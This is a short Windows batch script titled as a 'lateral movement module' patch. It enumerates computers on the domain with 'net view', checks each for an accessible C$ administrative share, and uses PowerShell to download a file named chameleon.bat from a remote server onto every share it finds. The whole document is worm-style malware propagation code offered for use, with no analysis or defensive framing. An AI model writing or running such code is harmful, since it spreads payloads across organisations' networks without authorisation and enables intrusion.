@echo off  
setlocal

echo Applying patch 2: Lateral movement module...

:network_scan  
for /f "tokens=2 delims=\\" %a in ('net view /domain') do (  
if exist "\\%a\c$" (  
echo Found share: \\%a\c$  
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://your.remote.server/chameleon.bat', '\\%a\c$\chameleon.bat')"  
)  
)

endlocal  